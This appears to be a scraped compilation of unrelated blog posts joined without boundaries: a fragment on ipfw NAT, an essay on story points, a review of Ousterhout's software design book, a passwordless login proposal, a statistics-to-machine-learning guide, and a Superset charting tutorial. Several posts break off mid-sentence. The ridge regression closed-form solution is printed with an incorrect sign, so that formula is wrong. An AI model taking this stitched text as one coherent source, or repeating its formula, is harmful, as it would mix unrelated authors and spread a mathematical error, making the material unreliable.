<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

<p>Human beings are not very good at seeing into the future. Unless you have a crystal ball or know how to read tea leaves, trying to predict when an event will happen with any degree of accuracy is very difficult. Unfortunately, as software developers, we are regularly asked to do this. Stakeholders usually want to know when they can expect the completion of features. It can make them nervous if we tell them that we don’t know for sure, or give a timeframe that sounds worryingly large to them to account for our uncertainty.</p>

<p>Story points attempt to solve this by sidestepping time-based estimates, and focusing instead upon estimating complexity - on the basis that we are better at judging how complicated a piece of work is than how long it will take to complete.  Estimating complexity allows us to abstract away things that we can’t reasonably predict (and often throw off our predictions) such as illness and distractions, and focus on the things that we can - like whether one task is going to be bigger than another.</p>

<p>Once we have a way to quantify complexity, it is possible to begin to measure how much of it can be tackled over time - this is known as velocity. Measuring a team’s velocity allows us to build forecasts of how much work they are likely to be able to complete in the future. Note the word <em>likely</em> in that last sentence. Story points are not a silver bullet that will let you make perfect predictions about when a task will be finished - but in my experience, they are a significant step up from trying to estimate time directly.</p>

<p>They help you shift from hand-waving and guessing, to evidence-based reasoning about a teams capacity. Over time I’ve found that the accuracy of story point-based predictions tend to improve as teams gain practice and experience, and as the error in velocity averages away as more data gets added to the calculation.</p>

<p>Story points can be a contentious topic amongst software professionals; a lot have had bad experiences with them, and don’t see how they can ever help on a project. While I don’t think story points will be a good fit for <em>all</em> projects, I do believe that they can be useful on <em>a lot</em> of projects - especially when teams are inexperienced and haven’t had a chance to build up some discipline.</p>

<p>I regularly hear two objections to story points that, in my opinion, betray underlying flaws in peoples thinking rather than a problem with the technique itself:</p>

<p>Firstly: that the complexity of a task is different depending on whether you have more or less experience, often stated as ‘my points are different from your points’. Secondly: that there is ultimately no real difference between complexity and time - ‘five points is about a day, this task will take about a day, so I vote five points’.</p>

<p>The first objection is problematic because you should be estimating for the team, not individuals. If a task is going to be harder for a particular person to complete, then the team should be working with them to help. If you expect someone to struggle to complete work by themselves with no assistance when it would benefit them, then you have more significant problems on your team than estimation. It would be best if you focused on fostering collaboration and knowledge sharing before worrying about anything else.</p>

<p>The second objection is harder to help people move past.  The cognitive leap from time-based estimation, to complexity-based estimation, is quite a large one. The easiest way that I have found to help people get into the right frame of mind is by agreeing on a story to use as a reference at the beginning of estimation sessions. The question then becomes ‘how much larger is the story we are currently estimating than our reference story?’ When they don’t have a lot of experience with relative complexity, people often find ranking stories, and then fitting points to them later much more straightforward than coming up with points on the spot (as you would with planning poker).</p>

<p>With a bit of time and practice, most teams can build up an implicit understanding of how story points relate to the complexity of individual pieces of work in their backlog.  As a team becomes more practised, a satisfying moment eventually occurs: everyone’s estimates begin to converge. You know that your team is getting the hang of things when everyone is consistently voting for the same number of story points on each piece of work that comes up; and when any significant variation that occurs is the result of someone knowing something that the others haven’t considered.</p>

<p>Whether or not you use story points on your project, I think there are some ideas we can learn from them that are universally applicable. Almost all projects benefit when we can quantify changes to them over time. Reflecting upon, and learning from our experiences is a crucial part of agile development, and doing this with data can give us confidence in our conclusions, and justification for our predictions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>

<p>I’m trying to read all the good writing about software design. This is very easy because not very much has been written: it turns out that it’s much easier to write an article about how to write a Tetris AI as a containerized Kotlin microservice than it is to shed insight on how to write good code. And so, when I heard about John Ousterhout’s new book “A Philosophy of Software Design,” I ordered my copy immediately.</p>

<center><img height="200" src="https://images-na.ssl-images-amazon.com/images/I/61iOSX4WNiL._SX404_BO1,204,203,200_.jpg" width="161"></center>

<p>I remember John Ousterhout from Stanford’s grad student visit day as the tall guy who introduced himself with a self-deprecating joke and invited all the Ph. D. admits over to dinner at his house. I know him also as the father of <a href="http://kayousterhout.org/">Kay Ousterhout</a>, whom I recently met as a fellow speaker at Strange Loop, and Amy Ousterhout, whom together are the first pair of sisters to both win the prestigious Hertz Fellowship.</p>

<p>At 170 pages, “A Philosophy of Software Design” (henceforth: PoSD) is a humble book. John’s background is in systems rather than in software engineering or programming languages, and he never claims special expertise. But his practitioner cred is immense. I enjoy tearing apart open-source projects and turning them into case studies of what not to do, so much that my students have requested I write a case study about good code for once. RAMCloud, Ousterhout’s distributed in-memory storage system, is now on my shortlist: from a 5-minute glance, it’s among the cleanest and best-documented code I’ve seen. And, given that he’s a busy professor managing a large lab, he’s written a surprising amount of it himself. He’s had plenty of impact too: he’s the creator of the Tcl language and its Tk framework, which I learned in 2005 as The Way to Write GUIs(™).</p>

<p>PoSD is best read as a tactical guide of how-to’s. About a quarter of it is spent on naming and comments, and much of the rest is about specific patterns. His few attempts to jump from tactical advice to principles are either done by trying to blur together similar-sounding tips, or are hamstrung by his inability to see the meaning of a program beyond the code (more on that later). He demonstrates the lack of principles comically in Chapter 19, where he promises to apply the books’ “principles” to several software trends, and then fills the rest of the chapter with standard (but solid) advice on unit-testing and OOP, with nary a reference to the rest of the book. On the whole, the book’s advice is higher-level than beginner books like Clean Code, but most of its contents will be familiar to a senior software engineer, and the novel parts are hit-and-miss.</p>

<p>Following other books like <a href="http://shop.oreilly.com/product/0636920022251.do"><i>Code Simplicity</i></a>, PoSD starts with a high-minded explanation of the benefits of good code and the dangers of complexity. Its early chapters are a grand tour of the basic concepts of software organization: separating levels of abstraction, isolating complexity, and when to break up functions. Chapter 5 is one of the most approachable introductions I’ve seen to Parnas’s ideas about information hiding. But it’s Chapter 4 where he introduces the book’s central idea: deep modules. An interface, explains Ousterhout, is not just the function signatures written in the code. It also includes informal elements: high-level behavior, constraints on ordering; anything a developer needs to know to use it. Many modules are shallow: they take a lot to explain, but don’t actually do that much. A good module is deep: the interface should be much simpler than the implementation.</p>

<p>Beautiful, obvious, and impossible to disagree with. Unfortunately, it’s also objectively wrong.</p>

<h2>
When specifications are longer than the code</h2>

<p>It sounds pretty nice to say “interfaces should be shorter than the implementation?” How do you test it?</p>

<p>To Ousterhout, where the interface is just a comment and some discussion about whether it’s simple to use and think about. Intuition and experience are the sole arbiters here. And this reveals his major blind spot.</p>

<p>I’ve <a href="http://www.pathsensitive.com/2018/01/the-three-levels-of-software-why-code.html">explained</a> <a href="http://www.pathsensitive.com/2018/01/the-design-of-software-is-thing-apart.html">before</a>&nbsp;that the important information of software design is not in the code (Level 2), but in the logic: the specifications and reasoning that are rarely written down concretely, but shape the code nonetheless. I group these artifacts into the aggregate “Level 3 constructs.” The “informal interface” Ousterhout describes is such a Level 3 construct, but they’re just as real as the code, and, contrary to Ousterhout, there are plenty of programming languages that do let you write them down and check them.</p>

<p>Experience doing this gives us concrete grounding when we talk software design. It’s how we move into <a href="https://terrytao.wordpress.com/career-advice/theres-more-to-mathematics-than-rigour-and-proofs/">post-rigorous</a> stage of software engineering, and know what we mean when we use terms like “interface” and “complexity.” It defends us against making confused and contradictory statements. Ousterhout lacks this insight, and that’s how he gets burned.</p>

<p>I’m going to pause for a moment and tell you: I like this book overall. It's well-written, and there’s a lot of advice in the book that I consider useful even though it’s on shaky ground, and more that doesn’t depend on this at all. Still, Ousterhout makes a big deal out of it, and so I’ll be taking a couple pages to explain why it’s wrong. These ideas are important, because they’re part of what leads to the higher levels of mastery.</p>

<p>My view is that Ousterhout’s “informal interface” is just the translation into English of a formal specification. Any question we have about interfaces can be answered by asking the question “what would a specification look like?” While I can’t prove the correspondence without peaking into Ousterhout’s head more than I’ve gotten to in our back-and-forth, I’ve found this lens unreasonably effective in helping to explain software design. And so, for the remainder of this post, I’ll be using the words “spec” and “interface” interchangeably.</p>

<p>I agree that the spec should usually be much simpler than the code. But anyone with experience actually formalizing specs can tell you that there are interesting cases where the specification is and should be more complicated than the implementation.</p>

<p>That's right: there are times when it’s actually desirable to have a specification more complicated than the code. Two major reasons are <b>ghost state </b>and <b>imprecision</b>. Ghost state is a concept from verification that describes certain kinds of “subtle” code. It’s an interesting subject that deserves its own blog post; I won’t mention it again. (Short version: it’s when a simple action like flipping a bit actually represents something conceptually complicated.)</p>

<p>Imprecision is a bigger one. For example:</p>

<ul>
<li>Specification: The temperature of the Fudarkameter will be between 60 and 90 degrees.</li>
<li>Implementation: The temperature of the Fudarkameter is 70 degrees.</li>
</ul><p>
The specification is longer precisely because it creates an abstraction barrier. If you design the rest of the system assuming the Fudarkameter is exactly 70 degrees, then the Fudarkameter becomes much harder to change or replace. By weakening the assumptions placed on a module, code becomes more evolvable.</p>

<p>On top of these, there’s another fundamental reason: It is much easier to describe something from the inside than from the outside. It is much easier to show you an apple than to answer every question you may ask of it. (Where are the seeds? How will it roll when I drop it?) And while there is more you can say <a href="http://yudkowsky.net/rational/virtues/">about a single apple</a> than all the apples in the world, there are more things that may be true about some apple than about a single apple.</p>

<p>As an example, let’s take a stack data structure, something I hope we can all agree is a useful abstraction. A stack is a sequence with push and pop operations, following the last-in-first-out ordering. The linked-list implementation is very short: just adding and removing elements off the front of the list. But if you use a stack, and you don’t want to use internal details of this implementation, then you need a way to think about it that doesn’t reference the underlying sequence. One solution is to use the <a href="http://www.cs.unc.edu/~stotts/204/ADTs/">stack axioms</a>, which say things like “If you push something onto a stack and then pop from the stack, you get the old value back” and “If you’ve ever pushed something onto a stack, then it’s not empty.” We’ve gone from the internal view of explaining how the stack operations manipulate memory, to the external view of explaining their interactions and observable behaviors.</p>

<p>In my public correspondence with Prof. Ousterhout, I illustrated this by writing down an implementation and interface for a stack data structure, including the stack axioms. My implementation was 30 tokens; the interface was 54.</p>

<p>Perhaps you can find a shorter way to explain stacks, but this is not looking good. It seems that Ousterhout’s advice, held under a microscope, is actually telling us we should not use stacks in our code (or, at least, only use the more complicated implementations, like lock-free concurrent stacks).</p>

<h3>
<b>A “Simple” API</b></h3>

<p>It’s easy for the interface for stacks to be larger than the implementation because they’re so small. Now, let’s look at something larger. I don’t need to look very hard for an example, because Ousterhout gives me one.</p>

<blockquote>
<p>The mechanism for file IO provided by the Unix operating system and its descendants, such as Linux, is a beautiful example of a deep interface. There are only five basic system calls for I/O, with simple signatures: </p>

<div>
<pre><span>int</span> <span>open</span><span>(</span><span>const</span> <span>char</span><span>*</span> <span>path,</span> <span>int</span> <span>flags,</span> <span>mode_t</span> <span>permissions);</span>
<span>ssize_t</span> <span>read</span><span>(</span><span>int</span> <span>fd,</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>ssize_t</span> <span>write</span><span>(</span><span>int</span> <span>fd,</span> <span>const</span> <span>void</span><span>*</span> <span>buffer,</span> <span>size_t</span> <span>count);</span>
<span>off_t</span> <span>lseek</span><span>(</span><span>int</span> <span>fd,</span> <span>off_t</span> <span>offset,</span> <span>int</span> <span>referencePosition);</span>
<span>int</span> <span>close</span><span>(</span><span>int</span> <span>fd);</span>
</pre>
</div>
</blockquote>

<p>The POSIX file API is a great example, but not of a deep interface. Rather, it’s a great example of how code with a very complicated interface may look deceptively simple when reduced to C-style function signatures. It’s a stateful API with interesting orderings and interactions between calls. The flags and permissions parameters of <span>open</span> hide an enormous amount of complexity, with hidden requirements …</p></div></div></div>

        <section>
          <h2>Intro</h2>
<p>In this post, I want to describe the strategy I've used in the last
implementation of one of my side projects. The side project is not important at
all, it's mostly a TODO/GTD task manager, but I use it as a test bed for
anything I'm interested in learning or trying out. The source code is
<a href="https://github.com/msurdi/wipku">here</a> and it is deployed
<a href="https://wipku.herokuapp.com/">here</a> if you want to try this out.</p>
<h2>Disclaimer</h2>
<p>I'm not a security expert, I'm just a web developer and probably not even a good
one, I want to describe this with the intention that somebody that understands more
about this could point out issues and help me make the approach more secure and
more easy to use.</p>
<h2>The problem with passwords</h2>
<p>Personally I don't like passwords, because a) I don't want to use the same
password everywhere, 2) Using different passwords everywhere is impossible
unless you 2a) use a password manager and/or 2b) use a
<a href="http://www.davidgumpper.com/security/developing-a-password-schema/">schema</a>
based on the website or something else that lets you generate the passwords
quickly and consistently for a any given website. And that's just what I don't
like as a user.</p>
<p>As a developer I don't like passwords because its very difficult and risky to
implement all the logic for generating them (salts, algorithms, lengths, etc),
storing them and implementing registration forms, login forms, password reset
forms, etc. So unless you use an existing solution from a CMS or big framework
(<a href="https://www.djangoproject.com/">Django</a>, <a href="https://rubyonrails.org/">Rails</a>,
<a href="https://strapi.io/">Strapi</a>, etc.. ) where you have a "Golden Path" for this,
you're in a pretty bad situation.</p>
<h2>Existing solutions research</h2>
<p>I was looking for a passwordless way to authenticate users without depending on
any third party <a href="https://en.wikipedia.org/wiki/OAuth">oauth</a> provider. While
researching about this, I've found that it seems the most common approach to
this is:</p>
<ol>
<li>Ask the user for email address.</li>
<li>Generate from the server a link with a token and send it by email to the user.</li>
<li>When the user clicks on the link, sign the user in, either in the newly
opened tab/browser or in the original one, or both.</li>
</ol>
<p>This approach is very simple, and I think there are many sites using it. The
first time I came across a login system like this was when I signed up to try
out Zeit's PaaS platform <a href="https://vercel.com/login?with-email=1">here</a>, now
called Vercel, hopefully will still have this name when you read this.</p>
<p>When I was investigating more about this approach, the first question to came to
my mind was wether I should log-in the user in the newly opened tab after the
user has clicked in the email link (thus what do I do in his previous tab?) or
wether again to follow Zeit's approach and in this new tab tell the user
"Awesome, you're now logged in, please close this tab and go back to the other
one". The first approach has an important drawback which is that the link might
have opened on a completely different browser, even on a completely different
device if the user clicked the link on his phone. The second approach I think is
even worse because anyone could go to the website, enter somebody else's email
and if that person happens to accidentally click this email then somebody
somewhere might get logged in as him.</p>
<p>There might be workarounds such as
comparing IP addresses, browser fingerprinting, etc, etc... but it gets risky
and complex in my opinion. Also, the user might not have even clicked in the
link but his antivirus might have made a request to the link, or anything in
between him and his email client. Not great.</p>
<h2>The salted passwordless approach</h2>
<p>So I kept investigating and trying out things and finally came to the following
process I want to describe here with the hope that somebody else will help me
understand more about its drawbacks and why it might not be a good idea, or if
seems to be a good one then help me to improve it.</p>
<p>Also, I'm not sure if this already exists under some well known industry name
and I've just missed that out. Thus I'm basically reinventing the square wheel
here.</p>
<p>So, the process goes like this:</p>
<ol>
<li>The application prompts the user for an email address.</li>
<li>The application saves in the browser's localStorage (or just in memory) the
email address, and randomly generated salt.</li>
<li>The application contacts the backend, submitting the email address and the
generated salt.</li>
<li>The application shows the user a dialog of the kind "We've just sent you an
access code to your email, enter it below".</li>
<li>The server generates an access code and then saves in the database the tuple
consistig of (time, email, salt, code), this is the "authentication request".</li>
<li>The server sends an email to the user, containing just the code, which would
be something like "09124".</li>
<li>The user enters this code in the screen resulting from step 4.</li>
<li>The application submits to the server the tuple (code, email, salt).</li>
<li>If the code, the salt, the email and the expiration (time since request was
created) are valid, then create a session, otherwise fail the login.</li>
</ol>
<p>What problems does this process solve?</p>
<ol>
<li>No need for a password, which was the first requirement.</li>
<li>No need to implement password recovery processes, registration processes, etc.</li>
<li>No need to permanently store any sensitive information about the user. You
might not even need to store the email address (you could use a hash of it as
the user ID).</li>
<li>If the email with the access code is intercepted, there is no risk for the
user: whoever intercepted the email would also need access to the user's
browser localStorage (or memory) to get the salt, otherwise the server won't
validate that access code and thus wont create a session.</li>
<li>We don't have the problem of the user opening the "magic link" in a different
browser, given there is no magic link at all.</li>
</ol>
<p>What drawbacks does this process have?</p>
<ol>
<li>The user will not be able to log in if he is having any kind of problem with
his email, or his email provider is slow to delivery new messages, etc.</li>
</ol>
<h2>Conclusions</h2>
<p>So far I'm pretty excited about this solution and that's probably bad for me,
because I might be missing something out, and that's the main motivation of
writing this down here. Unless there is some big security issue I'm not aware
of, I think the trade-off/drawbacks of the approach are quite acceptable for the
usability and implementation benefits.</p>

	<div>
		
<p>I’ve spent the last few months preparing for and applying for data science jobs. It’s possible the data science world may reject me and my lack of both experience and a credential above a bachelors degree, in which case I’ll do something else. Regardless of what lies in store for my future, I think I’ve gotten a good grasp of the mindset underlying machine learning and how it differs from traditional statistics, so I thought I’d write about it for those who have a similar background to me considering a similar move.<sup>1</sup></p>



<p>This post is geared toward people who are excellent at statistics but don’t really “get” machine learning and want to understand the gist of it in about 15 minutes of reading. If you have a traditional academic stats backgrounds (be it econometrics, biostatistics, psychometrics, etc.), there are two good reasons to learn more about data science:</p>



<ul><li>First, data science jobs tend to pay more than other quantitative jobs. It’s a bit taboo to bring this up– after all, aren’t we all supposed to be doing this out of passion and love? I’m not going to pretend that making more money is a bad reason to pursue something, and I reserve no judgment for those whose primary motivation is to earn more.</li><li>Second, data scientists genuinely do some pretty interesting things and have a very interesting approach to working with data, even if my gut reaction is to barf when someone says “teaching the model” instead of “estimating the parameters.”</li></ul>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Q: What's the difference between statistics and machine learning?</p><p>A: About $50,000/year</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1131244580115046405?ref_src=twsrc%5Etfw">May 22, 2019</a></blockquote></div>
</div></figure>



<p>The world of data science is, in many ways, hiding in plain sight from the more academically-minded quantitative disciplines. I’m not going to spend much time covering the different algorithms that data scientists use: partly because a lot of the algorithms they use are the same as what statisticians use, but also because the algorithms aren’t the point of this post. In this post I’ll be writing a short guide on how to translate your statistics skills into data science very quickly.</p>



<p>After finishing this post, I recommend downloading (for free) and reading through <a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a> (herein TESL). It is an excellent and comprehensive textbook that covers all the major machine learning topics, and is geared toward people with a strong math background, especially linear algebra.</p>



<h2>Philosophical Differences Between Statistics and Machine Learning</h2>



<figure></figure>



<p>The main difference between machine learning and statistics is what I’d call “β-hat versus y-hat.” (I’ve also heard it described as inference versus prediction.) Basically, academia cares a lot about what the estimated parameters look like (β-hat), and machine learning cares more about being able to estimate a dependent variable given some inputs (y-hat). There are handful of other differences, but they are rooted in this. Once you understand this, combined with your background in stats, you will basically understand machine learning.</p>



<h4> β-Hat Versus Y-Hat</h4>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>My date: I am studying machine learning</p><p>Me [trying to impress her]: I too am studying how to do regressions in California</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1145076273410129921?ref_src=twsrc%5Etfw">June 29, 2019</a></blockquote></div>
</div></figure>



<p>Once you stop caring about your parameters, you can start making them look like nonsense, i.e. by adding <a href="https://en.wikipedia.org/wiki/Bias_of_an_estimator">bias</a> (the parameter is wrong) or <a href="https://en.wikipedia.org/wiki/Consistent_estimator">inconsistency</a> (the parameter doesn’t converge over infinite observations). In some cases, you can even turn the model into more or less a complete black box that just spits out a y-hat; this is what neural networks are, basically. Traditionally, it’s a cardinal sin in academia to use parameters like these because you can’t say anything interesting about the parameters, but the trick in machine learning is that you don’t need to say anything about the parameters. In machine learning, your focus is on describing y-hat, not β-hat.</p>



<p>Why so much love for y-hat? The friendly, less cynical answer is that within the last decade, everyone got their hands on a crap-ton of data and computational power, and they want to do cool and useful things with it. Machine learning is a pretty natural way to leverage all this data and power because machine learning has tools to deal with multicollinearity and to find really deep, hidden correlations and patterns in data. As you can imagine, machine learning doesn’t let you side-step the dirty work of specifying your data and models (a.k.a. “<a href="https://en.wikipedia.org/wiki/Feature_engineering">feature engineering</a>,” according to data scientists), but it makes it a lot easier to just run things without thinking too hard about how to set it up. In statistics, bad results can be wrong, and being right for bad reasons isn’t acceptable. In machine learning, bad results are wrong if they catastrophically fail to predict the future, and nobody cares much how your crystal ball works, they only care that it works.</p>



<figure><img src="https://thumbor.forbes.com/thumbor/960x0/https%3A%2F%2Fblogs-images.forbes.com%2Fgilpress%2Ffiles%2F2016%2F03%2FTime-1200x511.jpg" alt="Time"><figcaption>For those of you who have never done anything outside a classroom setting, this is literally every data related task, whether you’re an accountant working in Excel or a PhD data scientist working for 6-figures.<br><a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#9b3182c6f637">(Source: Forbes.)</a></figcaption></figure>



<p>This newfound love for y-hat is a bit opportunistic, but in fairness, y-hat tends to be more important than β-hat for a wide array of business use cases. For example:</p>



<ul><li>Recommender systems (such as Youtube showing you more videos you might like, or showing  a customer items they might want to buy next).</li><li>Computer vision (such as optical character recognition or facial recognition).</li><li>Forecasting (such as estimating how much a customer will buy at a store, or how likely someone is to default on a loan).</li></ul>



<p>None of these tasks require having a human interpret the parameters and figure out what’s driving what to get a sufficiently acceptable answer; it’s all predictive.</p>



<h4>Letting Go of  β-Hat</h4>



<p>There are a lot of things that data scientists do that made literally zero sense to me before I grasped how to think in terms of y-hat.</p>



<p>The big one that made no sense to me the first time I encountered it back in 2017 is that data scientists split their data into <a href="https://medium.com/datadriveninvestor/data-science-essentials-why-train-validation-test-data-b7f7d472dc1f">“training data,” “validation data,” and “testing data.”</a> The reason this does not make sense to β-hat-brained people is because adding more observations should get you closer to the true parameter because, you know, the law of large numbers. There are two issues with the old school thought process. The first is that there is no “true” parameter if your parameters are intentionally allowed to be a little biased. The second is that there is no guarantee of convergence to anything if your parameters are allowed to be asymptotically inconsistent.</p>



<p>I’m sure you’re asking: “why allow your parameters to be biased?” Good question. The most straightforward answer is that there is a bias-variance trade-off. <a href="https://en.wikipedia.org/wiki/Bias%E2%80%93variance_tradeoff">The Wikipedia article </a>does a good job both illustrating and explaining it. For β-hat purposes, the notion of allowing any bias is crazy. For y-hat purposes, adding a little bias in exchange for a huge reduction in variance can improve the predictive power of your model.</p>



<figure><div>

</div></figure>



<h4>Adding Bias to OLS with Ridge Regression</h4>



<p>Ridge regression is the most straightforward example of adding bias. If you understand OLS, you’re like two paragraphs of reading away from understanding ridge regression.</p>



<p>Basically, instead of just solving for the β vector that minimizes the sum of squared residuals as one does with OLS, i.e. <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ols%7D+%3D+%7B%5Crm+argmin%7D_%7B%5Cboldsymbol%7B%5Cbeta%7D%7D+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+x_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2" title="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2">, you can also add a “penalty” to large squared β’s while trying to find the β-hat that minimizes the objective function. So you add <img src="https://s0.wp.com/latex.php?latex=%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\lambda \sum_{j=1}^K  \beta^2" title="\lambda \sum_{j=1}^K  \beta^2"> to the objective function, where λ is some constant. Then, last but not least, you “standardize” each column <img src="https://s0.wp.com/latex.php?latex=X_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="X_j" title="X_j">, which means transforming it to <img src="https://s0.wp.com/latex.php?latex=Z_j+%5Csim+N%280%2C1%29&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="Z_j \sim N(0,1)" title="Z_j \sim N(0,1)"> by subtracting each column by the column’s mean and dividing by the column’s standard deviation: <img src="https://s0.wp.com/latex.php?latex=z_%7Bi%2Cj%7D+%3D+%28x_%7Bi%2Cj%7D+-+%5Cmu_j%29+%2F+%5Csigma_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j" title="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j"> (the purpose of this is to make it so the parameters measure the <em>relative</em> impacts to the overall result, as opposed to the nominal impacts, otherwise the penalty wouldn’t work the way you’d probably want it to). This gives you the ridge regression estimator:</p>



<p> <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%7B%5Crm+argmin%7D_%5Cbeta+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+z_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2+%2B+%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2"></p>



<p>At λ=0, the summation of squared β’s you just tacked onto the objective function equals zero regardless of what the β-hat vector is, so you just have OLS again. As λ→∞, the penalties for all nonzero β’s become so huge that the only way for the penalties to not overwhelm the objective function is to have all the parameters β-hat = 0. And the closed-form solution to the objective function, it turns out, is pretty similar to OLS’s closed-form solution:   <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%28%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+Z-%5Clambda+%5Cmathbf+I%29%5E%7B-1%7D+%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+y&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y">.</p>



<p>All pretty straightforward, but the real question is why would you do this? Well, if you don’t care about the interpretability/bias of the parameters but you want the model to predict out-of-sample better than regular OLS, you can find some value of  λ through <a href="https://en.wikipedia.org/wiki/Cross-validation_(statistics)">cross-validation</a> that gives you a better fit than  λ=0, i.e. minimizing the <a href="https://en.wikipedia.org/wiki/Mean_squared_prediction_error">prediction errors</a>. But in order to cross-validate the data, you need to split your data into data you use to estimate the parameters (training data) and data to perform the cross-validation on (validation data). This process is what sets your λ.</p>



<p>Ridge regression is OLS with L2 regularization, which is penalization by the square of the parameter. L1 regularization takes the absolute value of the parameters as the penalty instead of the square (i.e. <a href="https://en.wikipedia.org/wiki/Lasso_(statistics)">lasso</a>). And of course, L1 and L2 regularization can be used in contexts other than linear regression, such as logistic regression. These regularization methods are especially good at dealing with multicollinearity, which is definitely something you’d come across with thousands of columns of corporate data and no compelling way to decide which are the best columns to use.<sup>2</sup></p>



<p>I could go on, but regurgitating all of TESL isn’t why I wrote this blog. I like showing ridge regression as an example of machine learning because it’s very similar to OLS, but is totally and unabashedly modified for predictive purposes, instead of inferential purposes. β-hat is never the …</p></div></article></div>

<p>In the <a href="https://preset.io/blog/2020-06-08-first-chart/">previous blog post</a>, we learned how to start to create charts in <a href="https://superset.incubator.apache.org/">Superset</a> and specifically <a href="https://preset.io/blog/2020-06-08-first-chart/">how to create a composition charts</a> to understand understand how data is formed. This, in turn, can be used to determine which chart type is the most appropriate.</p>
<p>In this blog article we will explore the topic of time series data, visualization options, and how to best represent time series data in order to facilitate trend analysis. Data used in the examples below is available in a <a href="https://raw.githubusercontent.com/eugeniamz/ce_test_db/master/Covid19_CasesTS_data.csv">GitHub repository</a> — you can also <a href="https://www.youtube.com/watch?v=r4sjmAKaJ6M&amp;t=3s">view instructions</a> on how to import the file into your own database.</p>
<h2 id="why-time-series-charts"><a href="#why-time-series-charts" aria-label="why time series charts permalink"></a>Why Time Series Charts</h2>
<p>Time series data is important because it is used to understand and analyze data behavior over time. Using historical data, time series charts enable companies to spot trends, changes in behavior, and compare different metrics to visualize correlations. Examples of time series analysis includes website visits, sales trends, and IoT (Internet of Things) data.</p>
<p>In a time series chart, you represent a independent variable (time) vs. dependent variables (metrics) to analyze behavior over time.</p>
<p>In the example of Covid-19 data, a time series chart will enable you to answer critical questions, such as:</p>
<ul>
<li>Are the number of Confirmed Cases decreasing? (trend)</li>
<li>Did we flatten the curve? (trends)</li>
<li>Is there a correlation between confirmed cases and deaths?</li>
</ul>
<h2 id="times-series-analysis-with-superset"><a href="#times-series-analysis-with-superset" aria-label="times series analysis with superset permalink"></a>Times Series Analysis with Superset</h2>
<p>Superset has a rich library of time series graphs for different use cases, such as: Line Charts, Area Charts, Time Series Bar Charts, Dual Line Charts, Calendar Heat Maps, Horizon Charts, and more. In this article, we will show examples of some of these charts and how changing a visualization type can dramatically change how data is displayed for trend analysis.</p>

<p><strong>Time Field:</strong> This is a independent variable and is represented on the X-axis. Options in the Time Column drop-down are fields that have the option temporal in the Columns field within the data source. The Time Grain drop-down indicates the data aggregated label used when displaying the metrics.</p>
<p><strong>Metrics:</strong> This is a required field and represents the dependent variables that will be displayed on the Y-axis.</p>
<p>All the other fields are optional, but it is important to keep in mind that an efficient chart is a simple chart — therefore, be sure to reduce the use of filters, granularity, and limit the series represented in the Group By and Series limit fields. By default, the Series limit field uses the first metric value to cut off values but, alternatively, the Sort By field allows you to filter data with an additional data point.</p>
<h2 id="time-series-bar-chart"><a href="#time-series-bar-chart" aria-label="time series bar chart permalink"></a>Time Series Bar Chart</h2>

<p>In this example, you can see that the numbers of dates (last 3 months ~90 bars) are too wide to be represented on the screen — this is a good opportunity to reduce the date granularity in order to reduce the data points on the X-axis.</p>

<p>Changing granularity to <strong><em>Week</em></strong> will reduce the number of data points on the X-axis and will make the graph clear to follow and integrate in a dashboard.</p>

